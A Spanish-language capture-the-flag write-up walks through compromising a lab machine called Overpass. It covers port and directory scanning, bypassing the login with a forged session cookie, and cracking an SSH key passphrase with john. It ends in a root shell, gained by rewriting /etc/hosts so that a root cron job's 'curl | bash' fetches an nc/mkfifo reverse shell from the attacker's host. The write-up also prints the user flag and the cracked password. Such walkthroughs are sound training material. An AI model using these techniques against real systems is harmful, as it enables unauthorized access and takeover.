# Introducción

Nos enfrentamos a una máquina o serie de máquinas que se hicieron como un reto, no sabemos a donde nos metemos e iremos enumerando e identificando servicios, sistema operativo, etc.

# Enumeración

## Test conectividad + SO

```
ping 10.10.67.222
PING 10.10.67.222 (10.10.67.222) 56(84) bytes of data.
64 bytes from 10.10.67.222: icmp_seq=1 ttl=64 time=0.328 ms
64 bytes from 10.10.67.222: icmp_seq=2 ttl=64 time=0.295 ms
64 bytes from 10.10.67.222: icmp_seq=3 ttl=64 time=0.280 ms
```

- Gracias a ver el ttl=64 damos por hecho que es un Linux

## Escáner puertos

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.67.222

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 08:33 BST
Nmap scan report for ip-10-10-67-222.eu-west-1.compute.internal (10.10.67.222)
Host is up (0.00027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (EdDSA)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
MAC Address: 02:88:3B:8C:BB:B5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
```

- Puerto 22 abierto (SSH)
- Puerto 80 abierto (HTTP)

![image](https://github.com/user-attachments/assets/80af246a-bfbc-49b9-9333-631114e70348)

Nos encontramos en el código fuente Un texto importante.

"Yeah right, just because the Romans used it doesn't make it military grade, change this?"

Refieriendose quizás a la criptografíada usada, doy por hecho que el método romano es el método de Cesar.

## Escáner de directorios

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.67.222/FUZZ
:: Progress: [107/220560] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er downloads               [Status: 301, Size: 0, Words: 1, Lines: 1]
:: Progress: [110/220560] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1]
:: Progress: [191/220560] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er admin                   [Status: 301, Size: 42, Words: 3, Lines: 3]
:: Progress: [288/220560] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er css                     [Status: 301, Size: 0, Words: 1, Lines: 1]
:: Progress: [21420/220560] :: Job [1/1] :: 19167 req/sec :: Duration: [0:00:01] http%3A%2F%2Fwww        [Status: 301, Size: 0, Words: 1, Lines: 1]
:: Progress: [54345/220560] :: Job [1/1] :: 14619 req/sec :: Duration: [0:00:04]http%3A%2F%2Fyoutube    [Status: 301, Size: 0, Words: 1, Lines: 1]
```

El único que veo factible es la ruta "admin"

![image](https://github.com/user-attachments/assets/3114e4b4-2bd7-474a-b741-11cb00b9b915)

Nos encontramos con un login.

Probando un poco y viendo información nos fijamos en el código JS, hay una función que se refiere a /api/login que manda un consulta POST

```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Como vemos las lineas finales, nos da una cookie de sesión, si intentamos poner unas credenciales al azar nos saldra "Incorrent credentials" pero si las credenciales son correctas, nos enviara una cookie con valor para poder logearnos.

Que pasaria si añadieramos manualmente y cambiamos la función a 

```
Cookies.set("SessionToken",400)
```

![image](https://github.com/user-attachments/assets/bc06e47b-1b29-4f8f-82af-9d5f54e5b1e4)

GG Tenemos una RSA privada para conectarnos por SSH

![image](https://github.com/user-attachments/assets/d159308d-36b1-4f66-97ca-2836bc7e9a0f)

Como podemos apreciar dicha clave privada esta encriptada y deberemos desencriptarla usando john

Para empezar utilizaremos "ssh2john.py" para sacar el hash del rsa y así poder crackearlo

```
locate ssh2john.py
python /opt/john/ssh2john.py id_rsa > crack
```

Cuando la crackeemos con john como sabemos que es una ssh, no sera necesario que especifiquemos el formato

```
john --wordlist=/usr/share/wordlists/rockyou.txt  crackNote: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:20 DONE (2024-09-27 09:00) 0.04926g/s 706487p/s 706487c/s 706487C/s *7¡Vamos!
Session completed. 
```

```
chmod 600 id_rsa 
root@ip-10-10-101-114:~# ssh -i id_rsa james@10.10.67.222
```

Estamos dentro

```
cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

# Escala de privilegios

Para empezar haremos lo más básico que es utilizar linpeas

```
locate linpeas
/opt/PEAS/linPEAS/linpeas.sh
/opt/PEAS/linPEAS/images/linpeas.png
root@ip-10-10-101-114:~# cd /opt/PEAS/linPEAS/linpeas.sh 
bash: cd: /opt/PEAS/linPEAS/linpeas.sh: Not a directory
root@ip-10-10-101-114:~# cd /opt/PEAS/linPEAS/
root@ip-10-10-101-114:/opt/PEAS/linPEAS# ls
images  linpeas.sh  README.md
root@ip-10-10-101-114:/opt/PEAS/linPEAS# python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Con el servidor abierto desde la máquina victima lo descargamos en tmp

```
cd /tmp
wget http://10.10.101.114:8000/linpeas.sh
--2024-09-27 08:12:53--  http://10.10.101.114:8000/linpeas.sh
Connecting to 10.10.101.114:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 233380 (228K) [text/x-sh]
Saving to: \u2018linpeas.sh\u2019

linpeas.sh          100%[===================>] 227.91K  --.-KB/s    in 0.08s   

2024-09-27 08:12:53 (2.69 MB/s) - \u2018linpeas.sh\u2019 saved [233380/233380]
```

```
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Hay una cosa muy chula por aquí 

```
+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/etc/hosts
/home/james
/run/lock
/run/screen
/run/screen/S-james
/run/user/1001
```

Lin peas nos dice que /etc/hosts se puede usar para escribir, con lo cuál podriamos llegar a redirigir un tráfico de por ejemplo "overpass.thm" a nuestra máquina y hacer una rev shell

Nos vamos a nuestra máquina normal y creamos un archivo con las mism ruta qe overpass.thm/downloads/src/buildscript.sh

```
/downloads/src# cat buildscript.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.101.114 1234 >/tmp/f
```

Nos vamos a /etc/hosts de la máquina victima y cambiamos la ip de "overpass.thm" a la nuestra

![image](https://github.com/user-attachments/assets/cb010dbb-27d5-4cbf-ba35-4b3a241bde16)

Deberemos abrir un servidor de python por el puerto 80 y simplemente esperar GG

Somo ROot

